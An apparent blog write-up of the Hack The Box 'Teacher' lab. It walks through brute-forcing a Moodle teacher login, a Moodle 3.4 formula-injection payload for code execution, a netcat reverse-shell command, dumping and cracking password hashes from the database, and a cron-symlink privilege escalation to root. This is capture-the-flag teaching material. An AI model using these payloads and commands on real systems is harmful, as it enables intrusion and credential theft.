<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Teacher HTB Write Up | AbusingLinux</title>
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="Teacher HTB Write Up" />
<meta name="author" content="isuckatlinux" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Introduction Hello everyone! Today we are going to be working on a HTB machine called Teacher. We will be practicing how to bruteforce some logins, also how to discover moodle version and how to attack an especific version of itself. Also we are going to see how to exploit missconfigured crontab." />
<meta property="og:description" content="Introduction Hello everyone! Today we are going to be working on a HTB machine called Teacher. We will be practicing how to bruteforce some logins, also how to discover moodle version and how to attack an especific version of itself. Also we are going to see how to exploit missconfigured crontab." />
<link rel="canonical" href="https://abusinglinux.com//2022/02/06/teacher-htb-writeup.html" />
<meta property="og:url" content="https://abusinglinux.com//2022/02/06/teacher-htb-writeup.html" />
<meta property="og:site_name" content="AbusingLinux" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-02-06T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Teacher HTB Write Up" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"isuckatlinux"},"dateModified":"2022-02-06T00:00:00+00:00","datePublished":"2022-02-06T00:00:00+00:00","description":"Introduction Hello everyone! Today we are going to be working on a HTB machine called Teacher. We will be practicing how to bruteforce some logins, also how to discover moodle version and how to attack an especific version of itself. Also we are going to see how to exploit missconfigured crontab.","headline":"Teacher HTB Write Up","mainEntityOfPage":{"@type":"WebPage","@id":"https://abusinglinux.com//2022/02/06/teacher-htb-writeup.html"},"url":"https://abusinglinux.com//2022/02/06/teacher-htb-writeup.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://abusinglinux.com//feed.xml" title="AbusingLinux" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">AbusingLinux<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
        
        <a class="color-cyan-hover" href="https://twitter.com/ISuckAtLinuxxx"><i class="fab fa-twitter-square"></i></a>
        
        
        
        <a class="color-purple-hover" href="https://github.com/isuckatlinux"><i class="fab fa-github-square"></i></a>
        
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">


<img src="
    /assets/linux.gif
" class="author-avatar" alt="Avatar" />
<div class="description">Hi, Im Pedro GarcÃ­a a cybersecurity and ethical hacking learner. I will be sharing on this web site all my knowledge of these particular arts. I hope you enjoy this blog as much as I do writting all this! <3
</div>

</div>


<div class="post">
  <h1 class="post-title">Teacher HTB Write Up</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/hackthebox/">hackthebox</a>
      
      <a class="tag" href="/tag/writeup/">writeup</a>
      
      <a class="tag" href="/tag/moodle/">moodle</a>
      
  </div>
  
  <div class="post-date">Published on 06 Feb 2022</div>
  
  <h2 id="introduction">Introduction</h2>
<p>Hello everyone! Today we are going to be working on a HTB machine called Teacher. We will be practicing how to bruteforce some logins, also how to discover moodle version and how to attack an especific version of itself. Also we are going to see how to exploit missconfigured crontab.</p>

<h2 id="ports-recognizement">Ports recognizement</h2>
<p>We are going to be discovering all open ports and extract the output into a grepeable file called <em>allPorts</em>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 10000 10.10.10.153 <span class="nt">-oG</span> allPorts
</code></pre></div></div>

<p>We are going to use <a href="https://github.com/isuckatlinux/getPorts">getPorts</a> in order to extract the ports from the grepeable file.</p>

<p>Now we can enummerate all the services that are running on the system.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-p80</span> <span class="nt">--min-rate</span> 10000 10.10.10.153 <span class="nt">-oN</span> services
</code></pre></div></div>
<p><img src="https://abusinglinux.com/assets/images/teacher-htb/services.png" alt="services-photo" /></p>

<h2 id="inspect-the-website">Inspect the website</h2>

<p>Meanwhile we inspect the site we are going to leave wfuzz running.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">--hc</span> 404 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-c</span> <span class="nt">-u</span> http://10.10.10.153/FUZZ
</code></pre></div></div>

<p>Most of the visible links doesnâ€™t work, except one, <em>gallery.html</em>.
We can see a bunch of blurred pictures, so maybe we have to apply <a href="https://www.youtube.com/watch?v=TWEXCYQKyDc">steganography</a>.</p>

<p>If we inspect the code we can notice that there is one picture that is slightly different than the otherâ€™s.</p>

<p><img src="https://abusinglinux.com/assets/images/teacher-htb/images_teacher.png" alt="photo" /></p>

<p>We are going to request that photo in order to see whatâ€™s hiding.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://10.10.10.153/images/5.png <span class="nt">-o</span> fake_picture.png
</code></pre></div></div>
<p><br />
If we try to see the picture:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>feh fake_picture.png
</code></pre></div></div>

<p><img src="https://abusinglinux.com/assets/images/teacher-htb/feh-error.png" alt="error-photo" /></p>

<p>We have an error that tell us that this picture is not actually a picture.
We will try to enumerate his content:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>fake_picture.png
</code></pre></div></div>
<p>The output:</p>
<pre><code class="language-txt">Hi Servicedesk,

I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

Could you guys figure out what the last charachter is, or just reset it?

Thanks,
Giovanni
</code></pre>
<p>While all this happen we can check wfuzz again and we discover a few sites, thereâ€™s one called <em>moodle</em> which have a login.ðŸ¤Ÿ</p>

<h2 id="bruteforce-login">Bruteforce login</h2>

<p>So now, we have the a potential teacherâ€™s username (Giovanni) and a incomplete password(Th4C00lTheacha) but we miss one character.</p>

<p>We can build a simple python3 script in order to get the last character of the password.
Hereâ€™s the <a href="https://github.com/isuckatlinux/htbmachines/blob/main/teacher/scripts/brute_pass_giovanni.py">script</a>
It is a simple brute force script which try three usernames (giovanni, Giovanni, giovanni@backhatuni.htb)
In case they were using private mail server.</p>

<p>We got that the credentials are <em>giovanni:Th4C00lTheacha#</em></p>

<p>We can login into moodle with that credentials.</p>

<p>If we inspect the chat he told the admin he wanâ€™t to make a quiz, that might be a clue.</p>

<h2 id="get-moodle-version">Get Moodle version</h2>

<p>Now we have teacherâ€™s credentials we have to find any vulneravility in the moodle service.
If we search for Moodle into the <a href="https://www.exploit-db.com/">exploit database</a> we have a few vulneravilities, but the problem is that we donâ€™t have the moodle version.</p>

<p>I create a <a href="https://github.com/isuckatlinux/moodleVersion">script</a> to get the version of a moodle service</p>

<p>If we run the script:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 authenticated_teacher_moodle_version.py <span class="nt">-u</span> http://10.10.10.153/moodle <span class="nt">--username</span> giovanni <span class="nt">--password</span> Th4C00lTheacha#
</code></pre></div></div>

<p>We have into the output that the moodle version is 3.4</p>

<p>Now if we look again in the <a href="https://www.exploit-db.com/">exploit database</a> filtering by 3.4 moodle version we can find that thereâ€™s a vulneravility what allow us to inyect code into a specific quiz.
This <a href="https://blog.sonarsource.com/moodle-remote-code-execution?redirect=rips">blog</a> relate very well the vulnearability if you want to check it out.</p>

<h2 id="getting-www-data-shell">Getting www-data shell</h2>

<p>If we look into the courses we can see thereâ€™s only one course wich is already finished (Algebra).
If we go into that course we can see a few resources into the course page.</p>

<p><img src="https://abusinglinux.com/assets/images/teacher-htb/algebrapage.png" alt="algebra-page" /></p>

<p>We can click into the setting and then turn editing on.
The we can add an activity or resource and we add a quiz.</p>

<p>We have to set a random name, random description and we have to save and display. The we have to edit the quiz and add a new question which will be a <em>Calculated</em>.
<br />
We have to add a random question name, a random question text, we will have to set the grade on 100%.
On the formula field is the place in which we have to set the payload which is</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cm">/*{a*/</span><span class="sb">`$_GET[0]`</span><span class="p">;</span><span class="c1">//{x}}</span>
</code></pre></div></div>
<p><em>Again, thereâ€™s more explanation about this exploit in this <a href="https://blog.sonarsource.com/moodle-remote-code-execution?redirect=rips">blog</a></em></p>

<p>So we set this string into the filed and then we save changes.
Since the php service is waiting for the 0 in the url to be execute we have to add to the url the payload in order to get the reverse shell:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp;0<span class="o">=(</span>nc <span class="nt">-e</span> /bin/bash <span class="nv">$IP</span> <span class="nv">$PORT</span><span class="o">)</span>
</code></pre></div></div>
<p>Before executing this we have to listn with netcat on the port that we selected, for example 443.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 443
</code></pre></div></div>
<p>We have a shell in www-data!</p>

<p>We can upgrade the shell with:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
</code></pre></div></div>

<h2 id="lateral-movement">Lateral movement</h2>

<p>If we list the users of the machine, we can see that giovanni is an user whoâ€™s problably have the user flag.
We can try to grab it:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /home/giovanni/user.txt
</code></pre></div></div>
<p>But we got an error.</p>

<p>We can try switch the user with the same password that we used before to login into the moodle site, but doesnâ€™t work.</p>

<p>If we look into the server files we can see a pretty interesting file called config.php.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>config.php
</code></pre></div></div>

<p>We can see the system that is running the database(mariadb), and some credentiales for the database(root:Welkom1!)</p>

<p>If we try to login to mariadb</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mariadb <span class="nt">-u</span> root <span class="nt">-p</span>
</code></pre></div></div>
<p>And we enter the password â€˜Welkom1!â€™, we are inside the database!</p>

<h3 id="enumerate-the-database">Enumerate the database</h3>

<p>We can list the databases:</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">show</span> <span class="n">databases</span><span class="p">;</span>
</code></pre></div></div>
<p>Output:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+--------------------+
| Database           |
+--------------------+
| information_schema |
| moodle             |
| mysql              |
| performance_schema |
| phpmyadmin         |
+--------------------+
</code></pre></div></div>
<p>moodle is an interesting database worth to explore.</p>

<p>Now we can list the tables:</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
</code></pre></div></div>
<p>Now we have a lot of tables, but there is one particular table which drag my attention called <em>mdl_user</em></p>

<p>We can describe the table;</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">describe</span> <span class="n">mdl_user</span><span class="p">;</span>
</code></pre></div></div>

<p>Now we have a lot of rows but again there are some rows particulally interesting, username and password.</p>

<p>So we create a query to list all the data about that fields:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="k">from</span> <span class="n">mdl_user</span><span class="p">;</span>
</code></pre></div></div>
<p>We have and output:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+-------------+--------------------------------------------------------------+
| username    | password                                                     |
+-------------+--------------------------------------------------------------+
| guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
| admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
| giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
| Giovannibak | 7a860966115182402ed06375cf0a22af                             |
+-------------+--------------------------------------------------------------+
</code></pre></div></div>
<p>As we can see there some password hashed but there is one from the user Giovannibak which is different and can remember us md5.</p>

<p>If we use some online md5 decriptor we can see that the password encripted is <em>expelled</em></p>

<p>Now we exit from the database and try to switch user with this password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su giovanni
expelled
</code></pre></div></div>

<p>We enter into the giovaniâ€™s account! We are in!
We can see the user flag.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /home/giovanni/user.txt
</code></pre></div></div>

<h2 id="pivilege-excalation">Pivilege excalation</h2>

<p>In the giovanniâ€™s workspace there are a few files. On one of them we can notice the timestamp of the file keep changing every minute so, we can deduce there is a cronjob replacing every minute the file.</p>

<p>We can search for a filename called backup</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-name</span> <span class="s2">"*backup*"</span> 2&gt; /dev/null
</code></pre></div></div>

<p>We see a bunch of files called backup
There is one file called backup.sh
We can inspect that file:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">cd</span> /home/giovanni/work<span class="p">;</span>
<span class="nb">tar</span> <span class="nt">-czvf</span> tmp/backup_courses.tar.gz courses/<span class="k">*</span><span class="p">;</span>
<span class="nb">cd </span>tmp<span class="p">;</span>
<span class="nb">tar</span> <span class="nt">-xf</span> backup_courses.tar.gz<span class="p">;</span>
<span class="nb">chmod </span>777 <span class="k">*</span> <span class="nt">-R</span><span class="p">;</span>
</code></pre></div></div>

<p>We can replace the course folder allocated at work with a symlink to /root.
We have to wait a minute to the cronjob to take effect and all the content of root will be copied at our courses folder.</p>

<p>To create the symbolic link:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> <span class="nt">-rf</span> courses
<span class="nb">ln</span> <span class="nt">-s</span> /root courses
</code></pre></div></div>
<p><em>Wait 1 minute</em></p>

<p>We can grab the flag!</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>courses
<span class="nb">cat </span>root.txt
</code></pre></div></div>


</div>


<div class="comments">
<div id="disqus_thread"></div>
<script>
 var disqus_config = function () {
     this.page.url = 'https://abusinglinux.com//2022/02/06/teacher-htb-writeup.html';
     this.page.identifier = '/2022/02/06/teacher-htb-writeup';
     this.page.title = 'Teacher HTB Write Up';
 };

 (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
     var d = document, s = d.createElement('script');

     s.src = '//https://abusinglinux.com/.disqus.com/embed.js';

     s.setAttribute('data-timestamp', +new Date());
     (d.head || d.body).appendChild(s);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2022/09/07/backdoor-htb-writeup.html">
            Backdoor HTB WriteUp
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2022/07/07/storing-api-credentials-in-Python.html">
            Storing API credentials on Python
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2022/02/11/get-full-interactive-reverse-shell-with-socat.html">
            Get Full Interactive reverse Shell With Socat
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/python/" class="set-1">Python</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/eternal-blue/" class="set-1">eternal-blue</a> <a href="/tag/good-practice/" class="set-1">good-practice</a> <a href="/tag/hackthebox/" class="set-5">hackthebox</a> <a href="/tag/moodle/" class="set-1">moodle</a> <a href="/tag/nosqlinyection/" class="set-1">nosqlinyection</a> <a href="/tag/parrot/" class="set-1">parrot</a> <a href="/tag/pentest-basics/" class="set-2">pentest-basics</a> <a href="/tag/python2/" class="set-1">python2</a> <a href="/tag/rce/" class="set-4">rce</a> <a href="/tag/reverse-shell/" class="set-4">reverse-shell</a> <a href="/tag/screen/" class="set-1">screen</a> <a href="/tag/socat/" class="set-1">socat</a> <a href="/tag/wordpress/" class="set-1">wordpress</a> <a href="/tag/writeup/" class="set-4">writeup</a></div>
  




<script>
  let i = 0;
  const text = '';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();

  // Image modal
  var $imgs = [];
  $('img').each(function(idx) {
    var obj = {
      src: $(this).attr('src')
    }
    $imgs.push(obj);
    var elem = $(this);
    $(this).click(function() {
      $('.modal').magnificPopup('open', idx);
    });
  });

  $('.modal').magnificPopup({
    items: $imgs,
    type: 'image',
    closeOnContentClick: true,
    mainClass: 'mfp-img-mobile',
    image: {
      verticalFit: true
    }
    
  });
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
